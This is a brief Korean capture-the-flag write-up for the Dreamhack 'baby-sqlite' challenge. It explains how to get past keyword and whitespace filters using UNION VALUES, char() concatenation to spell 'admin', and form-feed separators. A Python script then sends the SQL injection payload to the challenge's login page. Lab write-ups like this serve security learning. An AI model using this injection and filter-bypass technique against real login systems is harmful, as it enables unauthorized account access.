# baby-sqlite

문제에서 admin, select, 그리고 여러 공백 문자를 필터링 하고 있다.   
<br/>

* UNION 사용
* sqlite에서 select는 VALUES로 우회 가능
* admin은 char(0x61)||char(0x64)||char(0x6d)||char(0x69)||char(0x6e)처럼 우회 가능   
<br/>

```
import requests

def main():
	url = 'http://host1.dreamhack.games:22082/login'

	data = {
		'uid':'aaaa',
		'upw':'aaaa',
		'level':'1234\x0cUNION\x0cVALUES(char(0x61)||char(0x64)||char(0x6d)||char(0x69)||char(0x6e))'
	}

	response = requests.post(url, data=data)
	print response.text


if __name__=='__main__':
	main()
```
